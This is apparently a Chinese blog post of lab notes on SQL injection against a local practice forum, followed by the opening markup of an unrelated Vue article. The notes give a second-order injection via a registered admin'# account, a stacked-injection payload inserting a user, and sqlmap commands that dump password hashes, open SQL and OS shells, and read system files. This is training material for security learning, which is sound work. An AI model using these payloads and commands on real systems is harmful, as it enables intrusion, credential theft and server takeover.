ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">二次盲注</h2>
<p>⼆次注⼊是指已存储（数据库、⽂件）的⽤户输⼊被读取后，再次进⼊到SQL查询语句中导致
的注⼊</p>
<p>几乎所有任何网站后台都有一个用户叫admin 密码123456
先注册一个新的用户</p>
<p>admin-123456</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54bec814d16546b29e9c423808189ab7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=vBGveRtZJd90p1%2FlsWh%2B129FZvg%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba55b9d6386642c0b3257412fd3f3609~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=0%2Fucg14ULSQ35aQv4vSeY8kC1kk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">碰撞用户账户</h3>
<p>-刺探成功</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25a67260e418421eb414f26b6754b612~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=gxaaoXjjYHhKcjfpoRB0VV%2Bg3ng%3D" alt="image.png" loading="lazy"/></p>
<p>我自己去注册一个 admin'#</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cafcaa564d7345f6be2b0654962881c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=x0LCDvEBamlRgdBBIwBcwcs7IUg%3D" alt="image.png" loading="lazy"/></p>
<p>登录admin'#，然后修改密码--记一下改后的是456789</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e8048d316124b0eb494e88ab6a1a5e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=AA8yhXGtjD%2FJo4WdlXobzustqAo%3D" alt="image.png" loading="lazy"/>
-<strong>这是之前</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07bda3d2d1374ebb9a81a30f400f7972~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=Z8C298MFYCi2pSepfGkKSyuzFmw%3D" alt="image.png" loading="lazy"/>
<strong>刷新后，改变的是admin的密码，admin'#没有变</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db98c4a871bc463b93e1fc469dcd7585~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=I2iFuG3c3T44ksNb0h5WGtimKKI%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">查看原因</h3>
<p>源码 \bbs\member\updatePwd.php</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8986ccb5057b4f809ad11bb78a8e8ae6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=M87Uyv3cUivuDOfWYXE0%2FYempaw%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash">update <span class="hljs-built_in">users</span> <span class="hljs-built_in">set</span> password=md5(<span class="hljs-string">'123456'</span>)wherename=<span class="hljs-string">'admin'</span><span class="hljs-comment">#'</span>
</code></pre>
<p>简单来说就是sql的数据库语法 注释掉后面的内容
比如# 还有一个--也是</p>
<h2 data-id="heading-3">堆叠注入</h2>
<p>在SQL数据库中，每条语句是以;分开的，堆叠注⼊就是⼀次性注⼊并执⾏多条语句（多语句之间以分号
隔开）的注⼊⽅式。（故事：地铁出站套票⼀次性进两个⼈）</p>
<p>union联合查询注⼊执⾏的语句类型是有限的，可以⽤来执⾏查询语句。堆叠注⼊可以执⾏的是任意的语句，如增删改等</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf355f34d860443eb2095928491c83b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=0rST55thdd7iAkhEpCLJ2uW1e3U%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85d78c5c6717401882f025d9f995a318~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=clJYRtBEkR3OkO03BcwUnVyn6fc%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aba0b0c970da4fa7897dde1c8a5658cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=TJ8lvpbhCBzSEVOLzpkH4cRB4us%3D" alt="image.png" loading="lazy"/>
要堆叠，知道那个表结构用前面知识点获取表名字段名</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40ccb0bd8225472d9ccdec03e8ce5490~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=0gwKcQE%2FCun3YZk1nnSJTGTrik4%3D" alt="image.png" loading="lazy"/>
然后</p>
<pre><code class="hljs language-sql" lang="sql">?id<span class="hljs-operator">=</span><span class="hljs-number">2</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users (name,password) <span class="hljs-keyword">values</span>(<span class="hljs-string">'ddd'</span>,md5(<span class="hljs-string">'ddd'</span>));
</code></pre>
<p>堆叠不止 insert 还有delete 还有update</p>
<h2 data-id="heading-4">SQLMap</h2>
<p>sqlmap是⼀个开源的渗透测试⼯具，它可以⾃动化检测和利⽤SQL注⼊漏洞并接管数据库服务器。它有
⼀个强⼤的检测引擎，许多适合于终极渗透测试的良好特性和众多的操作选项
如果平时要探测bbs这个网站 这不得看看自己物理机ip</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbcfc36bd76a435eb7ce6d0c27c2bfd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=6%2FJqsRxx5RlGBu5QgQK9IuJtOlE%3D" alt="image.png" loading="lazy"/>
##SQLMap检测漏洞--探测目标网站有没有sql注入漏洞</p>
<pre><code class="hljs language-kali" lang="kali">sqlmap -u 'http://192.168.20.1/bbs/showmessage.php?id=1'
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3490361b55924dd782463b45e84ac2a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=132NKfK2nCE2ntcGgAENm9IhnuA%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b432202309f844619bc6513846ca5ff4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=Ma0RjjQEP1BpQDF5JOUyRxgUlhs%3D" alt="image.png" loading="lazy"/>
有这些东西 就代表着这些东西漏洞都是存在的--PHP具体版本 Apache</p>
<h3 data-id="heading-5">查询bbs网站当前数据库；<strong>当前数据库</strong><code>--current-db</code></h3>
<pre><code class="hljs language-kali" lang="kali">sqlmap -u 'http://192.168.20.1/bbs/showmessage.php?id=1' --current-db
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf7482d9d3de4ce580de89476fd077ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=UMWS8cWuuAPNIVQCPtLa%2FUQK4Zw%3D" alt="image.png" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f74f4b70e99547ccb08d91149e0cf8f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=c8K8x0CtAtgqSEh%2Fl%2BQzNgvlYM8%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-6">查看bbs网站的库有哪些表</h3>
<pre><code class="hljs language-kali" lang="kali">sqlmap -u 'http://192.168.220.1/bbs/showmessage.php?id=1' -D jrlt --tables
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6694aa4568f14acea7d9bc1a1e70f919~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=DmLBOq1PksppI2LKxi2vHvhCn50%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">当前表有哪些字段 列</h3>
<pre><code class="hljs language-kali" lang="kali">sqlmap -u 'http://192.168.20.1/bbs/showmessage.php?id=1' -D jrlt -T users --columns
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a58b25e2ff7c49c5adeda9acce5ac604~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=y0WycwJjOGFkpo94%2BpmHt5R%2F5WU%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">列出内容</h3>
<pre><code class="hljs language-kali" lang="kali">sqlmap -u 'http://192.168.20.1/bbs/showmessage.php?id=1' -D jrlt -T users -C password --dump#卡住的话不停的敲回⻋输⼊y
</code></pre>
<p>过程就是y到底，有一个选择字典，直接回车就行，然后在努力哈希破解</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b986ba4ecd1c4ef69eeade2e747dc2ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=smSUFPFYXnAlSBUVYUquNWSLYy8%3D" alt="image.png" loading="lazy"/>
和老师的不太一样 但是 无所谓了先
得到那些密码</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aaa042ac52df4430ad4df8ed1f3380e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=i%2FTcqaVGjeVu5Pib8EPW8GZsMYI%3D" alt="image.png" loading="lazy"/>
可以后期自己哈希解去
第三个解的很慢是因为我前面 做堆叠的时候改了admin的密码456789</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8d53612ef0240189d509f666369eb57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=ajmFnKqExAaH6lnFrSs4JT09FAo%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8fc367509d954c41869c6b5d5444d18a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=y946eGU4iCfeNEYfqygdWYBvRjA%3D" alt="image.png" loading="lazy"/></p>
<p>老师的就长这样</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4246721a8fd4a04bf4bd402f236d33d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=JwBmx3ttf2Rx2u%2Fgs9ar2bVF7LY%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">扩展操作</h3>
<pre><code class="hljs language-lua" lang="lua">
sqlmap -u <span class="hljs-string">'http://192.168.20.1/bbs/showmessage.php?id=1'</span> <span class="hljs-comment">--sql-shell</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ff4d1e26fd348a49a1e0455f2362716~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=TbXTANny3QKZS3Mtl0qYm0fWa%2BQ%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36ea5ceaf7f14a30a0ac24e075b67e8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=Ziv%2Bw7aZs26MWcihBSE0oLZY0JA%3D" alt="image.png" loading="lazy"/></p>
<p>退出语句</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc9d9953bdf44e5c8d43ecaa21342572~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=ThCDyRKt%2BF2ZAaoO30ZIfFhBsIM%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-10">密码爆破</h4>
<pre><code class="hljs language-lua" lang="lua">sqlmap -u <span class="hljs-string">'http://192.168.20.1/bbs/showmessage.php?id=1'</span> <span class="hljs-comment">--password</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/495765981755482c86b53d3f7adfc147~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=q9CjnjZeAh%2FkOEqCKP68yHDDqQM%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5be81abfc02e4526a99978bacd6787d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=Kk1eJtfZcfMc%2BvrDe3vvyW1sxzQ%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-11">系统命令</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e1b93d01d8b497aa2d9dd5713b26de3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=xwMTbZsAVniXQZmIEFXcdcLwwuk%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-lua" lang="lua">sqlmap -u <span class="hljs-string">'http://192.168.20.1/bbs/showmessage.php?id=1'</span> <span class="hljs-comment">--os-shell</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9129f1f11d194f95bf6dc21dbe701469~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=c%2FZLbwduJ2yISahGuougyCaiOhk%3D" alt="image.png" loading="lazy"/>
该靶机的 web 应用技术是<strong>PHP 5.4.45</strong>，选择与当前 web 语言匹配的 “PHP” 选项，才能成功创建 web 后门并获取操作系统命令行 shell。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fdec4c6d497542028e5cdce055701bc1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=kFVlJnFPfzyck6PTwM2tv9up2zI%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-12">文件读取</h4>
<p>出了问题</p>
<p>成功版本👇我把这个文件名称改了一下就行了，疑似第一次创的时候带入了奇怪字符或者电脑缓存没到位</p>
<pre><code class="hljs language-arduino" lang="arduino">sqlmap -u <span class="hljs-string">"http://192.168.20.1/bbs/showmessage.php?id=1"</span> --file-read <span class="hljs-string">"E:/e.txt"</span>
</code></pre>
<p>中间做的努力有</p>
<p>先执行基础注入命令，确认<code>id</code>参数确实存在 SQL 注入漏洞，避免在无效注入点上尝试高权限操作</p>
<pre><code class="hljs language-lua" lang="lua">sqlmap -u <span class="hljs-string">"http://192.168.20.1/bbs/showmessage.php?id=1"</span> <span class="hljs-comment">--dbs</span>
</code></pre>
<p>然后得出</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bec1daad32a4fb69aba0cc0ec5cad24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=As1cFD%2FT48LcjGYgtuOC7SGjBMQ%3D" alt="image.png" loading="lazy"/>
添加<code>-v 3</code>参数（详细输出执行过程），sqlmap 会显示文件读取过程中的具体错误（如「权限不足」「路径被禁止」），方便定位问题</p>
<pre><code class="hljs language-arduino" lang="arduino">sqlmap -u <span class="hljs-string">"http://192.168.20.1/bbs/showmessage.php?id=1"</span> --file-read <span class="hljs-string">"E:/e.txt"</span> -v <span class="hljs-number">3</span>
</code></pre>
<p>得出</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a68c00b240d4e1699ce8742a67136f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=WBaHmEKlQjfDVKeTGdjnj5RYEyE%3D" alt="image.png" loading="lazy"/></p>
<p>放弃自定义的<code>e.txt</code>，先尝试读取靶机系统默认存在、且权限宽松的文件，验证文件读取功能是否可用：</p>
<pre><code class="hljs language-bash" lang="bash">sqlmap -u <span class="hljs-string">"http://192.168.20.1/bbs/showmessage.php?id=1"</span> --file-read <span class="hljs-string">"C:/Windows/win.ini"</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4b6ccbeac0845e990b29b6e3b475987~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=LNH57qIkpD6%2BErI%2FKphsavIERfc%3D" alt="image.png" loading="lazy"/>
<strong>文件读取功能本身是正常的（因为成功读到了<code>C:/Windows/win.ini</code>），问题只出在「靶机上的<code>E:/e.txt</code>实际不存在 / 路径错误」</strong></p>
<p>具体分析如下：
能成功读取靶机的<code>C:/Windows/win.ini</code>，说明：</p>
<ul>
<li>数据库用户有<code>FILE</code>权限</li>
<li><code>secure_file_priv</code>配置无限制</li>
<li>操作系统层面的文件读取权限正常
所以改了个名字成功了</li>
</ul>
<p>回归主题</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d9922ed4e9a4632b9e650aaff777901~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=OzWzDiDRFcQpSV0dPVHm8SqU1Zo%3D" alt="image.png" loading="lazy"/>
返回让我访问这个文件的内容</p>
<p>'/root/.local/share/sqlmap/output/192.168.20.1/files/E__test.txt'</p>
<p>文件路径有了</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> <span class="hljs-string">'/root/.local/share/sqlmap/output/192.168.20.1/files/E__test.txt'</span> 
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a650c3500c0438b903e76c820453fac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=sMA8IL6jCe9YM%2Fh0YXAhMtUQY8c%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-13">WAF安全狗</h2>
<p>不要再物理机上装安全狗，会拖垮php，
卸载不掉就先这样吧</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 自定义指令生命周期钩子完全指南]]></title>    <link>https://juejin.cn/post/7595422019777544242</link>    <guid>https://juejin.cn/post/7595422019777544242</guid>    <pubDate>2026-01-15T10:52:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595422019777544242" data-draft-id="7595423767720673289" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 自定义指令生命周期钩子完全指南"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2026-01-15T10:52:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="北辰alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 自定义指令生命周期钩子完全指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    北辰alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:52:34.000Z" title="Thu Jan 15 2026 10:52:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 